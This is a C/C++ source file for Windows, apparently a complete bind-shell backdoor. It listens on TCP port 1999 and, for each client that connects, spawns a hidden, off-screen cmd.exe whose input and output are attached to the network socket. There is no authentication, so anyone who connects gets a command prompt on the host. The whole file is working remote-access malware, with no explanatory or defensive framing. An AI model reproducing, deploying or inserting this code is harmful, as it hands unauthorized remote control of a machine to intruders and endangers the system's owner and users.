#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <stdio.h>

#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_BUFLEN 512


void InitWinsock();
SOCKET CreateServerSocket(const char* port);
void Listen(SOCKET socket);
SOCKET AcceptClientSocket(SOCKET ListenSocket);
void SendMessageToClient(const char* message, SOCKET target);
wchar_t* toLPWSTR(const char* charArray);
DWORD CALLBACK Thread_ShellSpawner(LPVOID lpParam);

int main() {

	InitWinsock();
	SOCKET ServerSocket = CreateServerSocket("1999");
	Listen(ServerSocket);		

	while (1) {
		SOCKET ClientSocket = AcceptClientSocket(ServerSocket);
		if (ClientSocket == SOCKET_ERROR) break;
		printf("success");
		CreateThread(NULL, 0, Thread_ShellSpawner, (LPVOID)ClientSocket, 0, NULL);
	}

	closesocket(ServerSocket);
	WSACleanup();
	return 0;
}
void InitWinsock()
{
	WSADATA wsaData;
	int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf("WSAStartup failed: %d\n", iResult);
	}
}
SOCKET CreateServerSocket(const char* port)
{


	struct addrinfo* result = NULL, * ptr = NULL, hints;
	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	hints.ai_flags = AI_PASSIVE;


	int iResult = getaddrinfo(NULL, port, &hints, &result);
	if (iResult != 0) {
		printf("getaddrinfo failed: %d\n", iResult);
		WSACleanup();
	}


	// tạo socket 
	SOCKET ListenSocket = INVALID_SOCKET;
	ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
	if (ListenSocket == INVALID_SOCKET) {
		printf("Error at socket(): %ld\n", WSAGetLastError());
		freeaddrinfo(result);
		WSACleanup();
	}

	iResult = bind(ListenSocket, result->ai_addr, (int)result->ai_addrlen);
	if (iResult == SOCKET_ERROR) {
		printf("bind failed with error: %d\n", WSAGetLastError());
		freeaddrinfo(result);
		closesocket(ListenSocket);
		WSACleanup();

	}
	freeaddrinfo(result);

	return ListenSocket;
}
void Listen(SOCKET socket)
{
	if (listen(socket, SOMAXCONN) == SOCKET_ERROR) {
		printf("Listen failed with error: %ld\n", WSAGetLastError());
		closesocket(socket);
		WSACleanup();
	}
}
SOCKET AcceptClientSocket(SOCKET ListenSocket)
{
	SOCKET ClientSocket;
	ClientSocket = INVALID_SOCKET;

	// Accept a client socket
	ClientSocket = accept(ListenSocket, NULL, NULL);
	if (ClientSocket == INVALID_SOCKET) {
		printf("accept failed: %d\n", WSAGetLastError());
		closesocket(ListenSocket);
		WSACleanup();
	}
	return ClientSocket;
}
void SendMessageToClient(const char* message, SOCKET target)
{
	send(target, message, strlen(message), 0);
	getchar();
}
wchar_t* toLPWSTR(const char* charArray)
{
	wchar_t* wString = new wchar_t[4096];
	MultiByteToWideChar(CP_ACP, 0, charArray, -1, wString, 4096);
	return wString;
}
DWORD CALLBACK Thread_ShellSpawner(LPVOID lpParam)
{
	char szSystemDir[MAX_PATH + 1];
	GetSystemDirectoryA(szSystemDir, MAX_PATH);
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	SOCKET sClient = (SOCKET)lpParam;

	memset(&si, 0, sizeof(STARTUPINFO));
	si.cb = sizeof(STARTUPINFO);
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW | STARTF_USEPOSITION;
	si.wShowWindow = SW_HIDE;
	si.hStdError = si.hStdInput = si.hStdOutput = (HANDLE)sClient;
	si.dwX = GetSystemMetrics(SM_CXSCREEN);
	si.dwY = GetSystemMetrics(SM_CYSCREEN);

	SetCurrentDirectoryA(szSystemDir);
	CreateProcess(NULL, toLPWSTR("cmd"), NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
	WaitForSingleObject(pi.hProcess, INFINITE);
	closesocket(sClient);
	return 0;
}